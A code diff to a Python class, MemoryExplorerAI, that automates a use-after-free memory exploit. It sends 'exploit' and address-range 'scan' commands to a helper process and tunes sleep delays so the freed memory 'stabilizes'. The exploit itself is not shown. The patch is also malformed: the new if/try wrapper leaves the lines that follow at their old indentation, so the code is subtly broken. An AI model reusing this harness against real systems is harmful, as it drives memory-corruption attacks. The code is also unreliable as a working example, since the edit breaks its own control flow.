@@ -290,6 +290,8 @@ class MemoryExplorerAI:
             self.exploit_proc.stdin.write(b"exploit\n")
             self.exploit_proc.stdin.flush()
             line = self.exploit_proc.stdout.readline().decode().strip()
+            # Wait for UAF to stabilize as seen in v6.c
+            time.sleep(0.5)
             return line if line else "No response"
         except Exception as e:
             return f"Error: {str(e)}"
@@ -331,13 +333,14 @@ class MemoryExplorerAI:
                 except OSError: break
             
             # Wait for processes to settle
-            time.sleep(0.1)
+            time.sleep(0.3)
 
             # 2. Scan and record
             scan_success = False
-            try:
-                self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
-                self.exploit_proc.stdin.flush()
+            if self.ensure_engine():
+                try:
+                    self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
+                    self.exploit_proc.stdin.flush()
                 
                 while True:
                     line = self.exploit_proc.stdout.readline().decode().strip()
